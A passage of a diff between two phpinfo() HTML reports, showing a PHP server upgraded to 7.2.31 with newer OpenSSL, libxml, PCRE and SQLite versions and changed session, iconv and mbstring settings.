+<tr><td class="e">Protocols </td><td class="v">dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, ldaps, pop3, pop3s, rtmp, rtsp, scp, sftp, smb, smbs, smtp, smtps, telnet, tftp </td></tr>
 <tr><td class="e">Host </td><td class="v">x86_64-pc-linux-gnu </td></tr>
-<tr><td class="e">SSL Version </td><td class="v">OpenSSL/1.0.1t </td></tr>
-<tr><td class="e">ZLib Version </td><td class="v">1.2.8 </td></tr>
-<tr><td class="e">libSSH Version </td><td class="v">libssh2/1.4.3 </td></tr>
-</table><br />
+<tr><td class="e">SSL Version </td><td class="v">OpenSSL/1.1.1d </td></tr>
+<tr><td class="e">ZLib Version </td><td class="v">1.2.11 </td></tr>
+<tr><td class="e">libSSH Version </td><td class="v">libssh2/1.8.0 </td></tr>
+</table>
 <h2><a name="module_date">date</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">date/time support </td><td class="v">enabled </td></tr>
-<tr><td class="e">&quot;Olson&quot; Timezone Database Version </td><td class="v">2015.5 </td></tr>
+<tr><td class="e">timelib version </td><td class="v">2017.09 </td></tr>
+<tr><td class="e">&quot;Olson&quot; Timezone Database Version </td><td class="v">2018.9 </td></tr>
 <tr><td class="e">Timezone Database </td><td class="v">internal </td></tr>
 <tr><td class="e">Default timezone </td><td class="v">PRC </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
 <tr><td class="e">date.default_latitude</td><td class="v">31.7667</td><td class="v">31.7667</td></tr>
 <tr><td class="e">date.default_longitude</td><td class="v">35.2333</td><td class="v">35.2333</td></tr>
 <tr><td class="e">date.sunrise_zenith</td><td class="v">90.583333</td><td class="v">90.583333</td></tr>
 <tr><td class="e">date.sunset_zenith</td><td class="v">90.583333</td><td class="v">90.583333</td></tr>
 <tr><td class="e">date.timezone</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-</table><br />
+</table>
 <h2><a name="module_dom">dom</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">DOM/XML </td><td class="v">enabled </td></tr>
 <tr><td class="e">DOM/XML API Version </td><td class="v">20031129 </td></tr>
-<tr><td class="e">libxml Version </td><td class="v">2.9.1 </td></tr>
+<tr><td class="e">libxml Version </td><td class="v">2.9.4 </td></tr>
 <tr><td class="e">HTML Support </td><td class="v">enabled </td></tr>
 <tr><td class="e">XPath Support </td><td class="v">enabled </td></tr>
 <tr><td class="e">XPointer Support </td><td class="v">enabled </td></tr>
 <tr><td class="e">Schema Support </td><td class="v">enabled </td></tr>
 <tr><td class="e">RelaxNG Support </td><td class="v">enabled </td></tr>
-</table><br />
-<h2><a name="module_ereg">ereg</a></h2>
-<table border="0" cellpadding="3" width="600">
-<tr><td class="e">Regex Library </td><td class="v">Bundled library enabled </td></tr>
-</table><br />
+</table>
 <h2><a name="module_fileinfo">fileinfo</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">fileinfo support </td><td class="v">enabled </td></tr>
 <tr><td class="e">version </td><td class="v">1.0.5 </td></tr>
-</table><br />
+<tr><td class="e">libmagic </td><td class="v">531 </td></tr>
+</table>
 <h2><a name="module_filter">filter</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">Input Validation and Filtering </td><td class="v">enabled </td></tr>
-<tr><td class="e">Revision </td><td class="v">$Id: fbeb8bbbf6cc97f568996dac46e13e48e2907326 $ </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">Revision </td><td class="v">$Id: 5a34caaa246b9df197f4b43af8ac66a07464fe4b $ </td></tr>
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
 <tr><td class="e">filter.default</td><td class="v">unsafe_raw</td><td class="v">unsafe_raw</td></tr>
 <tr><td class="e">filter.default_flags</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-</table><br />
+</table>
 <h2><a name="module_ftp">ftp</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">FTP support </td><td class="v">enabled </td></tr>
-</table><br />
+<tr><td class="e">FTPS support </td><td class="v">enabled </td></tr>
+</table>
 <h2><a name="module_hash">hash</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">hash support </td><td class="v">enabled </td></tr>
-<tr><td class="e">Hashing Engines </td><td class="v">md2 md4 md5 sha1 sha224 sha256 sha384 sha512 ripemd128 ripemd160 ripemd256 ripemd320 whirlpool tiger128,3 tiger160,3 tiger192,3 tiger128,4 tiger160,4 tiger192,4 snefru snefru256 gost adler32 crc32 crc32b fnv132 fnv164 joaat haval128,3 haval160,3 haval192,3 haval224,3 haval256,3 haval128,4 haval160,4 haval192,4 haval224,4 haval256,4 haval128,5 haval160,5 haval192,5 haval224,5 haval256,5  </td></tr>
-</table><br />
+<tr><td class="e">Hashing Engines </td><td class="v">md2 md4 md5 sha1 sha224 sha256 sha384 sha512/224 sha512/256 sha512 sha3-224 sha3-256 sha3-384 sha3-512 ripemd128 ripemd160 ripemd256 ripemd320 whirlpool tiger128,3 tiger160,3 tiger192,3 tiger128,4 tiger160,4 tiger192,4 snefru snefru256 gost gost-crypto adler32 crc32 crc32b fnv132 fnv1a32 fnv164 fnv1a64 joaat haval128,3 haval160,3 haval192,3 haval224,3 haval256,3 haval128,4 haval160,4 haval192,4 haval224,4 haval256,4 haval128,5 haval160,5 haval192,5 haval224,5 haval256,5  </td></tr>
+</table>
+<table>
+<tr><td class="e">MHASH support </td><td class="v">Enabled </td></tr>
+<tr><td class="e">MHASH API Version </td><td class="v">Emulated Support </td></tr>
+</table>
 <h2><a name="module_iconv">iconv</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">iconv support </td><td class="v">enabled </td></tr>
 <tr><td class="e">iconv implementation </td><td class="v">glibc </td></tr>
-<tr><td class="e">iconv library version </td><td class="v">2.19 </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">iconv library version </td><td class="v">2.28 </td></tr>
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
-<tr><td class="e">iconv.input_encoding</td><td class="v">ISO-8859-1</td><td class="v">ISO-8859-1</td></tr>
-<tr><td class="e">iconv.internal_encoding</td><td class="v">ISO-8859-1</td><td class="v">ISO-8859-1</td></tr>
-<tr><td class="e">iconv.output_encoding</td><td class="v">ISO-8859-1</td><td class="v">ISO-8859-1</td></tr>
-</table><br />
+<tr><td class="e">iconv.input_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">iconv.internal_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">iconv.output_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+</table>
 <h2><a name="module_json">json</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">json support </td><td class="v">enabled </td></tr>
-<tr><td class="e">json version </td><td class="v">1.2.1 </td></tr>
-</table><br />
+<tr><td class="e">json version </td><td class="v">1.6.0 </td></tr>
+</table>
 <h2><a name="module_libxml">libxml</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">libXML support </td><td class="v">active </td></tr>
-<tr><td class="e">libXML Compiled Version </td><td class="v">2.9.1 </td></tr>
-<tr><td class="e">libXML Loaded Version </td><td class="v">20901 </td></tr>
+<tr><td class="e">libXML Compiled Version </td><td class="v">2.9.4 </td></tr>
+<tr><td class="e">libXML Loaded Version </td><td class="v">20904 </td></tr>
 <tr><td class="e">libXML streams </td><td class="v">enabled </td></tr>
-</table><br />
+</table>
 <h2><a name="module_mbstring">mbstring</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">Multibyte Support </td><td class="v">enabled </td></tr>
 <tr><td class="e">Multibyte string engine </td><td class="v">libmbfl </td></tr>
 <tr><td class="e">HTTP input encoding translation </td><td class="v">disabled </td></tr>
 <tr><td class="e">libmbfl version </td><td class="v">1.3.2 </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">oniguruma version </td><td class="v">6.3.0 </td></tr>
+</table>
+<table>
 <tr class="h"><th>mbstring extension makes use of "streamable kanji code filter and converter", which is distributed under the GNU Lesser General Public License version 2.1.</th></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr><td class="e">Multibyte (japanese) regex support </td><td class="v">enabled </td></tr>
 <tr><td class="e">Multibyte regex (oniguruma) backtrack check </td><td class="v">On </td></tr>
-<tr><td class="e">Multibyte regex (oniguruma) version </td><td class="v">5.9.2 </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">Multibyte regex (oniguruma) version </td><td class="v">6.3.0 </td></tr>
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
 <tr><td class="e">mbstring.detect_order</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">mbstring.encoding_translation</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">mbstring.func_overload</td><td class="v">0</td><td class="v">0</td></tr>
-<tr><td class="e">mbstring.http_input</td><td class="v">pass</td><td class="v">pass</td></tr>
-<tr><td class="e">mbstring.http_output</td><td class="v">pass</td><td class="v">pass</td></tr>
+<tr><td class="e">mbstring.http_input</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">mbstring.http_output</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">mbstring.http_output_conv_mimetypes</td><td class="v">^(text/|application/xhtml\+xml)</td><td class="v">^(text/|application/xhtml\+xml)</td></tr>
 <tr><td class="e">mbstring.internal_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">mbstring.language</td><td class="v">neutral</td><td class="v">neutral</td></tr>
 <tr><td class="e">mbstring.strict_detection</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">mbstring.substitute_character</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-</table><br />
+</table>
 <h2><a name="module_mysqlnd">mysqlnd</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><th>mysqlnd</th><th>enabled</th></tr>
-<tr><td class="e">Version </td><td class="v">mysqlnd 5.0.11-dev - 20120503 - $Id: 15d5c781cfcad91193dceae1d2cdd127674ddb3e $ </td></tr>
+<tr><td class="e">Version </td><td class="v">mysqlnd 5.0.12-dev - 20150407 - $Id: 3591daad22de08524295e1bd073aceeff11e6579 $ </td></tr>
 <tr><td class="e">Compression </td><td class="v">supported </td></tr>
 <tr><td class="e">core SSL </td><td class="v">supported </td></tr>
 <tr><td class="e">extended SSL </td><td class="v">supported </td></tr>
 <tr><td class="e">Command buffer size </td><td class="v">4096 </td></tr>
 <tr><td class="e">Read buffer size </td><td class="v">32768 </td></tr>
-<tr><td class="e">Read timeout </td><td class="v">31536000 </td></tr>
+<tr><td class="e">Read timeout </td><td class="v">86400 </td></tr>
 <tr><td class="e">Collecting statistics </td><td class="v">Yes </td></tr>
 <tr><td class="e">Collecting memory statistics </td><td class="v">No </td></tr>
 <tr><td class="e">Tracing </td><td class="v">n/a </td></tr>
 <tr><td class="e">Loaded plugins </td><td class="v">mysqlnd,debug_trace,auth_plugin_mysql_native_password,auth_plugin_mysql_clear_password,auth_plugin_sha256_password </td></tr>
 <tr><td class="e">API Extensions </td><td class="v"><i>no value</i> </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="h"><th>mysqlnd statistics</th><th> </th></tr>
 <tr><td class="e">bytes_sent </td><td class="v">0 </td></tr>
 <tr><td class="e">bytes_received </td><td class="v">0 </td></tr>
@@ -455,8 +463,10 @@ This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Eng
 <tr><td class="e">mem_free_amount </td><td class="v">0 </td></tr>
 <tr><td class="e">mem_estrndup_count </td><td class="v">0 </td></tr>
 <tr><td class="e">mem_strndup_count </td><td class="v">0 </td></tr>
-<tr><td class="e">mem_estndup_count </td><td class="v">0 </td></tr>
+<tr><td class="e">mem_estrdup_count </td><td class="v">0 </td></tr>
 <tr><td class="e">mem_strdup_count </td><td class="v">0 </td></tr>
+<tr><td class="e">mem_edupl_count </td><td class="v">0 </td></tr>
+<tr><td class="e">mem_dupl_count </td><td class="v">0 </td></tr>
 <tr><td class="e">proto_text_fetched_null </td><td class="v">0 </td></tr>
 <tr><td class="e">proto_text_fetched_bit </td><td class="v">0 </td></tr>
 <tr><td class="e">proto_text_fetched_tinyint </td><td class="v">0 </td></tr>
@@ -494,6 +504,7 @@ This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Eng
 <tr><td class="e">proto_binary_fetched_datetime </td><td class="v">0 </td></tr>
 <tr><td class="e">proto_binary_fetched_timestamp </td><td class="v">0 </td></tr>
 <tr><td class="e">proto_binary_fetched_string </td><td class="v">0 </td></tr>
+<tr><td class="e">proto_binary_fetched_json </td><td class="v">0 </td></tr>
 <tr><td class="e">proto_binary_fetched_blob </td><td class="v">0 </td></tr>
 <tr><td class="e">proto_binary_fetched_enum </td><td class="v">0 </td></tr>
 <tr><td class="e">proto_binary_fetched_set </td><td class="v">0 </td></tr>
@@ -532,314 +543,354 @@ This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Eng
 <tr><td class="e">com_deamon </td><td class="v">0 </td></tr>
 <tr><td class="e">bytes_received_real_data_normal </td><td class="v">0 </td></tr>
 <tr><td class="e">bytes_received_real_data_ps </td><td class="v">0 </td></tr>
-</table><br />
+</table>
 <h2><a name="module_openssl">openssl</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">OpenSSL support </td><td class="v">enabled </td></tr>
-<tr><td class="e">OpenSSL Library Version </td><td class="v">OpenSSL 1.0.1t  3 May 2016 </td></tr>
-<tr><td class="e">OpenSSL Header Version </td><td class="v">OpenSSL 1.0.1t  3 May 2016 </td></tr>
-</table><br />
+<tr><td class="e">OpenSSL Library Version </td><td class="v">OpenSSL 1.1.1d  10 Sep 2019 </td></tr>
+<tr><td class="e">OpenSSL Header Version </td><td class="v">OpenSSL 1.1.1d  10 Sep 2019 </td></tr>
+<tr><td class="e">Openssl default config </td><td class="v">/usr/lib/ssl/openssl.cnf </td></tr>
+</table>
+<table>
+<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
+<tr><td class="e">openssl.cafile</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">openssl.capath</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+</table>
 <h2><a name="module_pcre">pcre</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">PCRE (Perl Compatible Regular Expressions) Support </td><td class="v">enabled </td></tr>
-<tr><td class="e">PCRE Library Version </td><td class="v">8.38 2015-11-23 </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">PCRE Library Version </td><td class="v">8.41 2017-07-05 </td></tr>
+<tr><td class="e">PCRE JIT Support </td><td class="v">enabled </td></tr>
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
 <tr><td class="e">pcre.backtrack_limit</td><td class="v">1000000</td><td class="v">1000000</td></tr>
+<tr><td class="e">pcre.jit</td><td class="v">1</td><td class="v">1</td></tr>
 <tr><td class="e">pcre.recursion_limit</td><td class="v">100000</td><td class="v">100000</td></tr>
-</table><br />
-<h2><a name="module_PDO">PDO</a></h2>
-<table border="0" cellpadding="3" width="600">
+</table>
+<h2><a name="module_pdo">PDO</a></h2>
+<table>
 <tr class="h"><th>PDO support</th><th>enabled</th></tr>
 <tr><td class="e">PDO drivers </td><td class="v">sqlite </td></tr>
-</table><br />
+</table>
 <h2><a name="module_pdo_sqlite">pdo_sqlite</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><th>PDO Driver for SQLite 3.x</th><th>enabled</th></tr>
-<tr><td class="e">SQLite Library </td><td class="v">3.8.10.2 </td></tr>
-</table><br />
-<h2><a name="module_Phar">Phar</a></h2>
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">SQLite Library </td><td class="v">3.27.2 </td></tr>
+</table>
+<h2><a name="module_phar">Phar</a></h2>
+<table>
 <tr class="h"><th>Phar: PHP Archive support</th><th>enabled</th></tr>
 <tr><td class="e">Phar EXT version </td><td class="v">2.0.2 </td></tr>
 <tr><td class="e">Phar API version </td><td class="v">1.1.1 </td></tr>
-<tr><td class="e">SVN revision </td><td class="v">$Id: 17b0affd86ff751cb8e6046d04d91435b53fc6b8 $ </td></tr>
+<tr><td class="e">SVN revision </td><td class="v">$Id: ba76a9b0e06d536a9b602c782e38e6826cb4ee02 $ </td></tr>
 <tr><td class="e">Phar-based phar archives </td><td class="v">enabled </td></tr>
 <tr><td class="e">Tar-based phar archives </td><td class="v">enabled </td></tr>
 <tr><td class="e">ZIP-based phar archives </td><td class="v">enabled </td></tr>
 <tr><td class="e">gzip compression </td><td class="v">enabled </td></tr>
 <tr><td class="e">bzip2 compression </td><td class="v">disabled (install pecl/bz2) </td></tr>
 <tr><td class="e">Native OpenSSL support </td><td class="v">enabled </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="v"><td>
 Phar based on pear/PHP_Archive, original concept by Davey Shafik.<br />Phar fully realized by Gregory Beaver and Marcus Boerger.<br />Portions of tar implementation Copyright (c) 2003-2009 Tim Kientzle.</td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
 <tr><td class="e">phar.cache_list</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">phar.readonly</td><td class="v">On</td><td class="v">On</td></tr>
 <tr><td class="e">phar.require_hash</td><td class="v">On</td><td class="v">On</td></tr>
-</table><br />
+</table>
 <h2><a name="module_posix">posix</a></h2>
-<table border="0" cellpadding="3" width="600">
-<tr><td class="e">Revision </td><td class="v">$Id: 5d20de77687b7d961b15450873fa23b9e64a136a $ </td></tr>
-</table><br />
-<h2><a name="module_Reflection">Reflection</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
+<tr><td class="e">Revision </td><td class="v">$Id: 0a764bab332255746424a1e6cfbaaeebab998e4c $ </td></tr>
+</table>
+<h2><a name="module_reflection">Reflection</a></h2>
+<table>
 <tr class="h"><th>Reflection</th><th>enabled</th></tr>
-<tr><td class="e">Version </td><td class="v">$Id: dc76d2fe0f3e9c327c1d4ca617d94e26c7fae98d $ </td></tr>
-</table><br />
+<tr><td class="e">Version </td><td class="v">$Id: fe5f2178c6eb97631d3f8f03ceb9eddb88e664c7 $ </td></tr>
+</table>
 <h2><a name="module_session">session</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">Session Support </td><td class="v">enabled </td></tr>
 <tr><td class="e">Registered save handlers </td><td class="v">files user  </td></tr>
 <tr><td class="e">Registered serializer handlers </td><td class="v">php_serialize php php_binary  </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
 <tr><td class="e">session.auto_start</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">session.cache_expire</td><td class="v">180</td><td class="v">180</td></tr>
 <tr><td class="e">session.cache_limiter</td><td class="v">nocache</td><td class="v">nocache</td></tr>
 <tr><td class="e">session.cookie_domain</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-<tr><td class="e">session.cookie_httponly</td><td class="v">Off</td><td class="v">Off</td></tr>
+<tr><td class="e">session.cookie_httponly</td><td class="v">0</td><td class="v">0</td></tr>
 <tr><td class="e">session.cookie_lifetime</td><td class="v">0</td><td class="v">0</td></tr>
 <tr><td class="e">session.cookie_path</td><td class="v">/</td><td class="v">/</td></tr>
-<tr><td class="e">session.cookie_secure</td><td class="v">Off</td><td class="v">Off</td></tr>
-<tr><td class="e">session.entropy_file</td><td class="v">/dev/urandom</td><td class="v">/dev/urandom</td></tr>
-<tr><td class="e">session.entropy_length</td><td class="v">32</td><td class="v">32</td></tr>
+<tr><td class="e">session.cookie_secure</td><td class="v">0</td><td class="v">0</td></tr>
 <tr><td class="e">session.gc_divisor</td><td class="v">100</td><td class="v">100</td></tr>
 <tr><td class="e">session.gc_maxlifetime</td><td class="v">1440</td><td class="v">1440</td></tr>
 <tr><td class="e">session.gc_probability</td><td class="v">1</td><td class="v">1</td></tr>
-<tr><td class="e">session.hash_bits_per_character</td><td class="v">4</td><td class="v">4</td></tr>
-<tr><td class="e">session.hash_function</td><td class="v">0</td><td class="v">0</td></tr>
+<tr><td class="e">session.lazy_write</td><td class="v">On</td><td class="v">On</td></tr>
 <tr><td class="e">session.name</td><td class="v">PHPSESSID</td><td class="v">PHPSESSID</td></tr>
 <tr><td class="e">session.referer_check</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">session.save_handler</td><td class="v">files</td><td class="v">files</td></tr>
 <tr><td class="e">session.save_path</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
 <tr><td class="e">session.serialize_handler</td><td class="v">php</td><td class="v">php</td></tr>
+<tr><td class="e">session.sid_bits_per_character</td><td class="v">4</td><td class="v">4</td></tr>
+<tr><td class="e">session.sid_length</td><td class="v">32</td><td class="v">32</td></tr>
 <tr><td class="e">session.upload_progress.cleanup</td><td class="v">On</td><td class="v">On</td></tr>
 <tr><td class="e">session.upload_progress.enabled</td><td class="v">On</td><td class="v">On</td></tr>
 <tr><td class="e">session.upload_progress.freq</td><td class="v">1%</td><td class="v">1%</td></tr>
 <tr><td class="e">session.upload_progress.min_freq</td><td class="v">1</td><td class="v">1</td></tr>
 <tr><td class="e">session.upload_progress.name</td><td class="v">PHP_SESSION_UPLOAD_PROGRESS</td><td class="v">PHP_SESSION_UPLOAD_PROGRESS</td></tr>
 <tr><td class="e">session.upload_progress.prefix</td><td class="v">upload_progress_</td><td class="v">upload_progress_</td></tr>
-<tr><td class="e">session.use_cookies</td><td class="v">On</td><td class="v">On</td></tr>
-<tr><td class="e">session.use_only_cookies</td><td class="v">On</td><td class="v">On</td></tr>
-<tr><td class="e">session.use_strict_mode</td><td class="v">Off</td><td class="v">Off</td></tr>
+<tr><td class="e">session.use_cookies</td><td class="v">1</td><td class="v">1</td></tr>
+<tr><td class="e">session.use_only_cookies</td><td class="v">1</td><td class="v">1</td></tr>
+<tr><td class="e">session.use_strict_mode</td><td class="v">0</td><td class="v">0</td></tr>
 <tr><td class="e">session.use_trans_sid</td><td class="v">0</td><td class="v">0</td></tr>
-</table><br />
-<h2><a name="module_SimpleXML">SimpleXML</a></h2>
-<table border="0" cellpadding="3" width="600">
+</table>
+<h2><a name="module_simplexml">SimpleXML</a></h2>
+<table>
 <tr class="h"><th>Simplexml support</th><th>enabled</th></tr>
-<tr><td class="e">Revision </td><td class="v">$Id: 6b8e23a01a85046737ef7d31346da5164505c179 $ </td></tr>
+<tr><td class="e">Revision </td><td class="v">$Id: 341daed0ee94ea8f728bfd0ba4626e6ed365c0d1 $ </td></tr>
 <tr><td class="e">Schema support </td><td class="v">enabled </td></tr>
-</table><br />
-<h2><a name="module_SPL">SPL</a></h2>
-<table border="0" cellpadding="3" width="600">
+</table>
+<h2><a name="module_sodium">sodium</a></h2>
+<table>
+<tr class="h"><th>sodium support</th><th>enabled</th></tr>
+<tr><td class="e">libsodium headers version </td><td class="v">1.0.17 </td></tr>
+<tr><td class="e">libsodium library version </td><td class="v">1.0.17 </td></tr>
+</table>
+<h2><a name="module_spl">SPL</a></h2>
+<table>
 <tr class="h"><th>SPL support</th><th>enabled</th></tr>
-<tr><td class="e">Interfaces </td><td class="v">Countable, OuterIterator, RecursiveIterator, SeekableIterator, SplObserver, SplSubject </td></tr>
+<tr><td class="e">Interfaces </td><td class="v">OuterIterator, RecursiveIterator, SeekableIterator, SplObserver, SplSubject </td></tr>
 <tr><td class="e">Classes </td><td class="v">AppendIterator, ArrayIterator, ArrayObject, BadFunctionCallException, BadMethodCallException, CachingIterator, CallbackFilterIterator, DirectoryIterator, DomainException, EmptyIterator, FilesystemIterator, FilterIterator, GlobIterator, InfiniteIterator, InvalidArgumentException, IteratorIterator, LengthException, LimitIterator, LogicException, MultipleIterator, NoRewindIterator, OutOfBoundsException, OutOfRangeException, OverflowException, ParentIterator, RangeException, RecursiveArrayIterator, RecursiveCachingIterator, RecursiveCallbackFilterIterator, RecursiveDirectoryIterator, RecursiveFilterIterator, RecursiveIteratorIterator, RecursiveRegexIterator, RecursiveTreeIterator, RegexIterator, RuntimeException, SplDoublyLinkedList, SplFileInfo, SplFileObject, SplFixedArray, SplHeap, SplMinHeap, SplMaxHeap, SplObjectStorage, SplPriorityQueue, SplQueue, SplStack, SplTempFileObject, UnderflowException, UnexpectedValueException </td></tr>
-</table><br />
+</table>
 <h2><a name="module_sqlite3">sqlite3</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><th>SQLite3 support</th><th>enabled</th></tr>
-<tr><td class="e">SQLite3 module version </td><td class="v">0.7-dev </td></tr>
-<tr><td class="e">SQLite Library </td><td class="v">3.8.10.2 </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">SQLite3 module version </td><td class="v">7.2.31 </td></tr>
+<tr><td class="e">SQLite Library </td><td class="v">3.27.2 </td></tr>
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
+<tr><td class="e">sqlite3.defensive</td><td class="v">1</td><td class="v">1</td></tr>
 <tr><td class="e">sqlite3.extension_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-</table><br />
+</table>
 <h2><a name="module_standard">standard</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">Dynamic Library Support </td><td class="v">enabled </td></tr>
 <tr><td class="e">Path to sendmail </td><td class="v"> -t -i  </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
 <tr><td class="e">assert.active</td><td class="v">1</td><td class="v">1</td></tr>
 <tr><td class="e">assert.bail</td><td class="v">0</td><td class="v">0</td></tr>
 <tr><td class="e">assert.callback</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">assert.exception</td><td class="v">0</td><td class="v">0</td></tr>
 <tr><td class="e">assert.quiet_eval</td><td class="v">0</td><td class="v">0</td></tr>
 <tr><td class="e">assert.warning</td><td class="v">1</td><td class="v">1</td></tr>
 <tr><td class="e">auto_detect_line_endings</td><td class="v">0</td><td class="v">0</td></tr>
 <tr><td class="e">default_socket_timeout</td><td class="v">60</td><td class="v">60</td></tr>
 <tr><td class="e">from</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-<tr><td class="e">url_rewriter.tags</td><td class="v">a=href,area=href,frame=src,form=,fieldset=</td><td class="v">a=href,area=href,frame=src,form=,fieldset=</td></tr>
+<tr><td class="e">session.trans_sid_hosts</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">session.trans_sid_tags</td><td class="v">a=href,area=href,frame=src,form=</td><td class="v">a=href,area=href,frame=src,form=</td></tr>
+<tr><td class="e">url_rewriter.hosts</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">url_rewriter.tags</td><td class="v">form=</td><td class="v">form=</td></tr>
 <tr><td class="e">user_agent</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-</table><br />
+</table>
 <h2><a name="module_tokenizer">tokenizer</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">Tokenizer Support </td><td class="v">enabled </td></tr>
-</table><br />
+</table>
 <h2><a name="module_xml">xml</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">XML Support </td><td class="v">active </td></tr>
 <tr><td class="e">XML Namespace Support </td><td class="v">active </td></tr>
-<tr><td class="e">libxml2 Version </td><td class="v">2.9.1 </td></tr>
-</table><br />
+<tr><td class="e">libxml2 Version </td><td class="v">2.9.4 </td></tr>
+</table>
 <h2><a name="module_xmlreader">xmlreader</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">XMLReader </td><td class="v">enabled </td></tr>
-</table><br />
+</table>
 <h2><a name="module_xmlwriter">xmlwriter</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr><td class="e">XMLWriter </td><td class="v">enabled </td></tr>
-</table><br />
+</table>
 <h2><a name="module_zlib">zlib</a></h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><th>ZLib Support</th><th>enabled</th></tr>
 <tr><td class="e">Stream Wrapper </td><td class="v">compress.zlib:// </td></tr>
 <tr><td class="e">Stream Filter </td><td class="v">zlib.inflate, zlib.deflate </td></tr>
-<tr><td class="e">Compiled Version </td><td class="v">1.2.8 </td></tr>
-<tr><td class="e">Linked Version </td><td class="v">1.2.8 </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
